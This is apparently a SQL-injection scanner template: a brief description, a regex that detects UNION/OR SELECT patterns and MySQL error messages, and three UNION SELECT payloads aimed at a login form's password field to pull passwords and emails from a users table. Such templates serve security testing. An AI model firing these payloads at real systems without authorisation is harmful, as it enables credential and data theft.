info: An SQLi injection involves attacker sending SQL queries to the database server.

matches.regex: \b(UNION|OR)\b.+( SELECT\b|\b1=1\b)|Syntax error|Unknown column|You have an error in your SQL syntax|error in your SQL syntax|mysql_fetch_array\(\) expects parameter 1 to be resource|Warning: mysql_num_rows\(\): supplied argument is not a valid MySQL result resource

payloads: username=admin&password=1 UNION SELECT * FROM users WHERE id = 1--
username=admin&password=1 UNION SELECT password FROM users WHERE username = 'admin'--
username=admin&password=1 UNION SELECT email FROM users WHERE id = 1--
